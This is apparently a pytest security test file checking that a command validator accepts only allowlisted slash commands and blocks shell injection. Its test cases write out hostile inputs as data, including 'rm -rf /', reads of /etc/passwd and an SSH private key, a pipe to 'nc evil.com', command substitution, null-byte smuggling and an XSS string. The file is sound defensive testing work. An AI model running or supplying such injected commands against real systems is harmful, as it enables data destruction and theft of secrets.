"""Security tests for SIMSTIM-002: Command Injection via /start_phase.

Tests verify that:
- Only allowlisted commands are accepted
- Shell metacharacters are rejected
- Arguments are properly validated
- Injection attempts are blocked
"""

import pytest
from simstim.validation import (
    validate_phase_command,
    validate_callback_request_id,
    sanitize_for_display,
    ALLOWED_PHASE_COMMANDS,
    DANGEROUS_CHARS,
    ValidationResult,
)


class TestValidatePhaseCommand:
    """Test phase command validation."""

    # Valid command tests
    @pytest.mark.parametrize(
        "command",
        [
            "/implement sprint-1",
            "/implement sprint-99",
            "/review-sprint sprint-1",
            "/audit-sprint sprint-5",
            "/plan-and-analyze",
            "/architect",
            "/sprint-plan",
            "/deploy-production",
            "/mount",
            "/ride",
            "/validate",
            "/ledger",
            "/run sprint-1",
            "/run-status",
            "/run-halt",
            "/run-resume",
        ],
    )
    def test_valid_commands_accepted(self, command):
        """Test that valid commands are accepted."""
        result = validate_phase_command(command)
        assert result.valid, f"Expected valid: {command}, got error: {result.error}"
        assert result.sanitized is not None

    def test_valid_command_returns_sanitized(self):
        """Test that valid commands return sanitized version."""
        result = validate_phase_command("/implement sprint-1")
        assert result.valid
        # shlex.quote only adds quotes if necessary (sprint-1 is safe as-is)
        assert result.sanitized == "/implement sprint-1"

    # Invalid command tests
    @pytest.mark.parametrize(
        "command",
        [
            "/unknown-command",
            "/rm -rf /",
            "/exec something",
            "not-a-slash-command",
            "ls -la",
            "/bin/bash",
        ],
    )
    def test_invalid_commands_rejected(self, command):
        """Test that unknown commands are rejected."""
        result = validate_phase_command(command)
        assert not result.valid
        assert result.error is not None
        assert "Unknown command" in result.error or "Invalid" in result.error


class TestCommandInjectionPrevention:
    """Test command injection attack vectors are blocked."""

    # Shell metacharacter injection attempts
    @pytest.mark.parametrize(
        "injection",
        [
            "/implement sprint-1; rm -rf /",
            "/implement sprint-1 && cat /etc/passwd",
            "/implement sprint-1 | nc evil.com 1234",
            "/implement sprint-1 $(whoami)",
            "/implement sprint-1 `id`",
            "/implement sprint-1\nrm -rf /",
            "/implement sprint-1\\ncat /etc/passwd",
            "/implement sprint-1 > /tmp/evil",
            "/implement sprint-1 < /etc/passwd",
            "/implement sprint-1 || echo pwned",
            "/implement sprint-1 & background",
            "/implement sprint-1#comment",
            "/implement sprint-1$(cat /etc/passwd)",
            "/implement ${HOME}",
            "/implement ~root/.ssh/id_rsa",
            "/implement sprint-1 * glob",
            "/implement sprint-1 ? single",
            "/implement sprint-1 [a-z] range",
            "/implement sprint-1 {a,b} brace",
            "/implement sprint-1 (subshell)",
            "/implement sprint-1 !history",
        ],
    )
    def test_shell_injection_blocked(self, injection):
        """Test that shell metacharacter injection is blocked."""
        result = validate_phase_command(injection)
        assert not result.valid, f"Injection should be blocked: {injection}"
        assert "Invalid character" in result.error or "Invalid" in result.error

    def test_newline_injection_blocked(self):
        """Test that newline injection is blocked."""
        result = validate_phase_command("/implement sprint-1\n/rm -rf /")
        assert not result.valid
        assert "Invalid character" in result.error

    def test_carriage_return_injection_blocked(self):
        """Test that carriage return injection is blocked."""
        result = validate_phase_command("/implement sprint-1\r\nmalicious")
        assert not result.valid


class TestArgumentValidation:
    """Test command argument validation."""

    def test_sprint_format_validation(self):
        """Test sprint argument format validation."""
        # Valid formats
        assert validate_phase_command("/implement sprint-1").valid
        assert validate_phase_command("/implement sprint-99").valid

        # Invalid formats
        result = validate_phase_command("/implement sprint-0")
        assert not result.valid

        result = validate_phase_command("/implement sprint-100")
        assert not result.valid

        result = validate_phase_command("/implement invalid")
        assert not result.valid

    def test_sprint_commands_require_argument(self):
        """Test that sprint commands require an argument."""
        sprint_commands = ["/implement", "/review-sprint", "/audit-sprint", "/run"]

        for cmd in sprint_commands:
            result = validate_phase_command(cmd)
            assert not result.valid
            assert "requires" in result.error.lower()

    def test_archive_cycle_requires_label(self):
        """Test that /archive-cycle requires a label."""
        result = validate_phase_command("/archive-cycle")
        assert not result.valid
        assert "requires" in result.error.lower()

    def test_archive_cycle_with_valid_label(self):
        """Test /archive-cycle with valid labels."""
        result = validate_phase_command("/archive-cycle MVP")
        assert result.valid

        result = validate_phase_command("/archive-cycle 'Security Remediation'")
        assert result.valid


class TestAllowlist:
    """Test command allowlist integrity."""

    def test_allowlist_not_empty(self):
        """Test that allowlist is not empty."""
        assert len(ALLOWED_PHASE_COMMANDS) > 0

    def test_allowlist_contains_core_commands(self):
        """Test that allowlist contains expected core commands."""
        core_commands = {
            "/plan-and-analyze",
            "/architect",
            "/sprint-plan",
            "/implement",
            "/review-sprint",
            "/audit-sprint",
            "/deploy-production",
        }
        assert core_commands.issubset(ALLOWED_PHASE_COMMANDS)

    def test_allowlist_is_frozen(self):
        """Test that allowlist cannot be modified at runtime."""
        assert isinstance(ALLOWED_PHASE_COMMANDS, frozenset)

    def test_dangerous_chars_is_frozen(self):
        """Test that dangerous chars cannot be modified at runtime."""
        assert isinstance(DANGEROUS_CHARS, frozenset)


class TestCallbackRequestIdValidation:
    """Test callback request ID validation."""

    @pytest.mark.parametrize(
        "valid_id",
        [
            "abc12345",
            "request-id-here",
            "a1b2c3d4-e5f6-7890-abcd-ef0123456789",
            "ABCDEF12",
        ],
    )
    def test_valid_request_ids(self, valid_id):
        """Test valid request IDs are accepted."""
        result = validate_callback_request_id(valid_id)
        assert result.valid

    @pytest.mark.parametrize(
        "invalid_id",
        [
            "",
            "short",  # Too short
            "a" * 100,  # Too long
            "has spaces in it",
            "has;semicolon",
            "has|pipe",
            "has&ampersand",
        ],
    )
    def test_invalid_request_ids(self, invalid_id):
        """Test invalid request IDs are rejected."""
        result = validate_callback_request_id(invalid_id)
        assert not result.valid


class TestSanitizeForDisplay:
    """Test display sanitization."""

    def test_html_escaped(self):
        """Test HTML characters are escaped."""
        text = "<script>alert('xss')</script>"
        result = sanitize_for_display(text)
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_truncation(self):
        """Test long text is truncated."""
        text = "a" * 500
        result = sanitize_for_display(text, max_length=100)
        assert len(result) == 100
        assert result.endswith("...")

    def test_empty_input(self):
        """Test empty input returns empty string."""
        assert sanitize_for_display("") == ""
        assert sanitize_for_display(None) == ""  # type: ignore


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_command(self):
        """Test empty command is rejected."""
        result = validate_phase_command("")
        assert not result.valid

    def test_none_command(self):
        """Test None command is rejected."""
        result = validate_phase_command(None)  # type: ignore
        assert not result.valid

    def test_whitespace_only_command(self):
        """Test whitespace-only command is rejected."""
        result = validate_phase_command("   ")
        assert not result.valid

    def test_whitespace_normalization(self):
        """Test whitespace is normalized."""
        result = validate_phase_command("/implement    sprint-1")
        assert result.valid
        # Multiple spaces should be collapsed
        assert "    " not in result.sanitized

    def test_leading_trailing_whitespace(self):
        """Test leading/trailing whitespace is trimmed."""
        result = validate_phase_command("  /implement sprint-1  ")
        assert result.valid


class TestDefenseInDepth:
    """Test defense-in-depth measures."""

    def test_double_encoding_blocked(self):
        """Test double-encoded injection is blocked."""
        # URL-encoded semicolon
        result = validate_phase_command("/implement sprint-1%3Brm -rf /")
        # Even if not decoded, the % should not cause issues
        assert not result.valid or "%3B" not in result.sanitized

    def test_unicode_normalization(self):
        """Test unicode variants don't bypass validation."""
        # Full-width semicolon
        result = validate_phase_command("/implement sprint-1；rm")  # U+FF1B
        # Should either be rejected or not contain the character
        if result.valid:
            assert "rm" not in result.sanitized

    def test_null_byte_injection(self):
        """Test null byte injection is handled."""
        result = validate_phase_command("/implement sprint-1\x00malicious")
        # Should be rejected or sanitized
        if result.valid:
            assert "\x00" not in result.sanitized
